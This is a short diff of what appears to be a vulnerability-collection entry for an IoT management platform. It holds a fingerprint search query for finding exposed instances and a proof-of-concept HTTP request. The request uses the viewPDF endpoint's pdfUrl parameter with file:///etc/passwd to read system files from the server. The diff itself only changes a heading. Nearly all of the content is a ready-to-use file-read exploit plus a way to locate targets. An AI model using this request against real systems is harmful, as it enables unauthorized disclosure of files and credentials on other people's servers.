@@ -8,7 +8,7 @@
 body="location.hash.indexOf('/authLogin')" || body="客户端会小于800" || title="智能物联综合管理平台" || body="* 客户端会小于800*" || body="/static/fontshd/font-hd.css"
 ```
 
-## poc
+## POC
 ```
 GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1
 Host: target.com
